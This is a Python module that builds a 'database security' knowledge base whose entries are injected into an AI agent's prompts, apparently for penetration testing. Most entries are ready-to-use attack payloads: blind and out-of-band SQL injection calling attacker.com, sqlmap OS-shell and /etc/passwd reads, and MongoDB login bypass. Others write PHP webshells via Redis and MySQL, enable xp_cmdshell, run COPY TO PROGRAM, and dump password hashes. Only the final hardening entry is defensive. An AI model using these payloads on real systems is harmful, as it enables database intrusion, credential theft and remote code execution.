"""Database security knowledge base.

Deep knowledge about database vulnerabilities:
1. SQL injection advanced techniques
2. NoSQL injection attacks
3. Database privilege escalation
4. Data extraction techniques
5. Database hardening assessment
"""

from __future__ import annotations

from dataclasses import dataclass, field
from typing import Any

import structlog

logger = structlog.get_logger()


@dataclass
class DatabasePattern:
    """A database security pattern."""
    pattern_id: str = ""
    name: str = ""
    category: str = ""
    severity: str = "high"
    description: str = ""
    detection_strategy: str = ""
    tools: list[str] = field(default_factory=list)

    def to_dict(self) -> dict[str, Any]:
        return {
            "id": self.pattern_id,
            "name": self.name[:25],
            "category": self.category[:12],
        }


DATABASE_PATTERNS: list[dict[str, Any]] = [
    {
        "id": "db-001", "name": "Advanced SQL Injection",
        "category": "sqli", "severity": "critical",
        "desc": "Advanced SQL injection techniques beyond basic UNION/error-based.",
        "detection": (
            "ADVANCED SQL INJECTION:\n"
            "BLIND SQLi:\n"
            "  Boolean-based:\n"
            "    ' AND 1=1-- (true)\n"
            "    ' AND 1=2-- (false)\n"
            "    ' AND SUBSTRING(user(),1,1)='r'--\n"
            "  Time-based:\n"
            "    ' AND SLEEP(5)--\n"
            "    ' AND IF(1=1,SLEEP(5),0)--\n"
            "    '; WAITFOR DELAY '0:0:5'-- (MSSQL)\n"
            "    ' AND pg_sleep(5)-- (PostgreSQL)\n"
            "OUT-OF-BAND:\n"
            "  MySQL: LOAD_FILE(CONCAT('\\\\\\\\',user(),'.attacker.com\\\\a'))\n"
            "  MSSQL: exec xp_dirtree '//attacker.com/a'\n"
            "  Oracle: UTL_HTTP.REQUEST('http://attacker.com/'||user)\n"
            "SECOND ORDER:\n"
            "  - Payload stored in DB, triggered later\n"
            "  - Register with malicious username\n"
            "  - Profile update triggers stored payload\n"
            "FILTER BYPASS:\n"
            "  - Case variation: SeLeCt\n"
            "  - Comments: SEL/**/ECT\n"
            "  - URL encoding: %53%45%4C%45%43%54\n"
            "  - Double encoding\n"
            "  - Unicode: SELECT → \\u0053ELECT\n"
            "  - Null byte: %00\n"
            "TOOLS:\n"
            "  sqlmap -u <url> --batch --level=5 --risk=3\n"
            "  sqlmap -u <url> --os-shell  # OS command execution\n"
            "  sqlmap -u <url> --file-read=/etc/passwd"
        ),
        "tools": ["sqlmap"],
    },
    {
        "id": "db-002", "name": "NoSQL Injection",
        "category": "nosqli", "severity": "critical",
        "desc": "NoSQL database injection attacks.",
        "detection": (
            "NoSQL INJECTION:\n"
            "MONGODB:\n"
            "  Authentication bypass:\n"
            "    {\"username\": {\"$gt\": \"\"}, \"password\": {\"$gt\": \"\"}}\n"
            "    {\"username\": {\"$ne\": \"invalid\"}, \"password\": {\"$ne\": \"invalid\"}}\n"
            "  Data extraction:\n"
            "    {\"username\": {\"$regex\": \"^a\"}}  # Boolean oracle\n"
            "    {\"$where\": \"this.password.length > 0\"}\n"
            "  JavaScript injection:\n"
            "    {\"$where\": \"function(){return true}\"}\n"
            "    {\"$where\": \"sleep(5000)\"}\n"
            "COUCHDB:\n"
            "  - /_all_dbs  # List all databases\n"
            "  - /_users/_all_docs  # List users\n"
            "  - /_config  # Server config (admin party)\n"
            "REDIS:\n"
            "  - redis-cli -h <target> INFO\n"
            "  - redis-cli CONFIG SET dir /var/www/html\n"
            "  - redis-cli CONFIG SET dbfilename shell.php\n"
            "  - redis-cli SET payload '<?php system($_GET[\"cmd\"]);?>'\n"
            "  - redis-cli BGSAVE  # Write webshell\n"
            "ELASTICSEARCH:\n"
            "  - curl http://<target>:9200/_cat/indices\n"
            "  - curl http://<target>:9200/_search?q=*\n"
            "  - Groovy script injection (old versions)"
        ),
        "tools": ["nosqlmap", "redis-cli"],
    },
    {
        "id": "db-003", "name": "Database Privilege Escalation",
        "category": "privesc", "severity": "critical",
        "desc": "Escalating privileges within databases.",
        "detection": (
            "DATABASE PRIVILEGE ESCALATION:\n"
            "MYSQL:\n"
            "  - UDF (User Defined Function) exploitation\n"
            "  - FILE privilege → read/write files\n"
            "  SELECT LOAD_FILE('/etc/passwd');\n"
            "  SELECT '<?php system($_GET[c]);?>' INTO OUTFILE '/var/www/shell.php';\n"
            "  - mysql.user table direct modification\n"
            "  - Trigger-based escalation\n"
            "POSTGRESQL:\n"
            "  - COPY TO/FROM for file read/write\n"
            "  COPY (SELECT '') TO PROGRAM 'id';  # Command exec\n"
            "  - Large object manipulation\n"
            "  - Extension loading (CREATE EXTENSION)\n"
            "  - pg_read_file('/etc/passwd')\n"
            "  - CVE-2019-9193: COPY FROM PROGRAM\n"
            "MSSQL:\n"
            "  - xp_cmdshell (exec OS commands)\n"
            "  EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;\n"
            "  EXEC xp_cmdshell 'whoami';\n"
            "  - sp_OACreate (COM object)\n"
            "  - OPENROWSET for file access\n"
            "  - Linked servers for lateral movement\n"
            "  - Impersonation (EXECUTE AS LOGIN)\n"
            "ORACLE:\n"
            "  - Java stored procedures (OS execution)\n"
            "  - DBMS_SCHEDULER for command exec\n"
            "  - UTL_FILE for file operations\n"
            "  - DBA role escalation via GRANT"
        ),
        "tools": ["sqlmap", "mssqlclient"],
    },
    {
        "id": "db-004", "name": "Database Enumeration",
        "category": "enum", "severity": "medium",
        "desc": "Enumerating database structure and data.",
        "detection": (
            "DATABASE ENUMERATION:\n"
            "MYSQL:\n"
            "  SELECT version();\n"
            "  SELECT schema_name FROM information_schema.schemata;\n"
            "  SELECT table_name FROM information_schema.tables WHERE table_schema='<db>';\n"
            "  SELECT column_name FROM information_schema.columns WHERE table_name='<table>';\n"
            "  SELECT user,password FROM mysql.user;\n"
            "POSTGRESQL:\n"
            "  SELECT version();\n"
            "  SELECT datname FROM pg_database;\n"
            "  SELECT tablename FROM pg_tables WHERE schemaname='public';\n"
            "  SELECT usename,passwd FROM pg_shadow;\n"
            "MSSQL:\n"
            "  SELECT @@version;\n"
            "  SELECT name FROM master..sysdatabases;\n"
            "  SELECT name FROM <db>..sysobjects WHERE xtype='U';\n"
            "  SELECT name,password_hash FROM sys.sql_logins;\n"
            "ORACLE:\n"
            "  SELECT * FROM v$version;\n"
            "  SELECT owner,table_name FROM all_tables;\n"
            "  SELECT username FROM all_users;\n"
            "TOOLS:\n"
            "  sqlmap --dbs  # List databases\n"
            "  sqlmap -D <db> --tables  # List tables\n"
            "  sqlmap -D <db> -T <table> --dump  # Dump data"
        ),
        "tools": ["sqlmap"],
    },
    {
        "id": "db-005", "name": "Database Hardening Assessment",
        "category": "hardening", "severity": "medium",
        "desc": "Assessing database hardening and security configuration.",
        "detection": (
            "DATABASE HARDENING ASSESSMENT:\n"
            "COMMON CHECKS:\n"
            "  - Default credentials (sa, root, postgres, admin)\n"
            "  - Remote access enabled (bind 0.0.0.0)\n"
            "  - Unencrypted connections\n"
            "  - Excessive privileges to app users\n"
            "  - Audit logging disabled\n"
            "  - Outdated versions with known CVEs\n"
            "MYSQL HARDENING:\n"
            "  - mysql_secure_installation run?\n"
            "  - Anonymous accounts: SELECT user FROM mysql.user WHERE user='';\n"
            "  - Remote root: SELECT host,user FROM mysql.user WHERE user='root';\n"
            "  - FILE privilege: SELECT user,file_priv FROM mysql.user;\n"
            "  - SSL enforcement: SHOW VARIABLES LIKE 'require_secure_transport';\n"
            "POSTGRESQL HARDENING:\n"
            "  - pg_hba.conf authentication methods\n"
            "  - trust authentication = no auth\n"
            "  - SSL mode: SHOW ssl;\n"
            "  - Password encryption: SHOW password_encryption;\n"
            "MSSQL HARDENING:\n"
            "  - sa account disabled?\n"
            "  - xp_cmdshell disabled?\n"
            "  - CLR enabled? (CHECK sp_configure)\n"
            "  - Linked servers reviewed?\n"
            "  - Transparent Data Encryption?"
        ),
        "tools": ["nmap", "sqlmap", "hydra"],
    },
]


class DatabaseSecurityKB:
    """Database security knowledge base.

    Provides database vulnerability patterns
    injected into agent prompts.
    """

    def __init__(self) -> None:
        self._patterns: dict[str, DatabasePattern] = {}
        self._log = logger.bind(component="database_security_kb")
        self._load_patterns()

    def _load_patterns(self) -> None:
        """Load database patterns."""
        for data in DATABASE_PATTERNS:
            pattern = DatabasePattern(
                pattern_id=data["id"],
                name=data["name"],
                category=data.get("category", ""),
                severity=data.get("severity", "high"),
                description=data.get("desc", ""),
                detection_strategy=data.get("detection", ""),
                tools=data.get("tools", []),
            )
            self._patterns[pattern.pattern_id] = pattern

    def get_by_category(self, category: str) -> list[DatabasePattern]:
        """Get patterns by category."""
        return [
            p for p in self._patterns.values()
            if p.category.lower() == category.lower()
        ]

    def build_database_prompt(
        self,
        categories: list[str] | None = None,
        max_patterns: int = 4,
    ) -> str:
        """Build database security prompt."""
        lines = ["## Database Security Patterns\n"]
        count = 0
        for pattern in self._patterns.values():
            if categories and pattern.category.lower() not in [c.lower() for c in categories]:
                continue
            if count >= max_patterns:
                break
            lines.append(f"### {pattern.name} [{pattern.category.upper()}]")
            lines.append(pattern.detection_strategy)
            lines.append("")
            count += 1
        return "\n".join(lines)

    def get_stats(self) -> dict[str, Any]:
        cat_counts: dict[str, int] = {}
        for p in self._patterns.values():
            cat_counts[p.category] = cat_counts.get(p.category, 0) + 1
        return {
            "patterns": len(self._patterns),
            "by_category": cat_counts,
        }
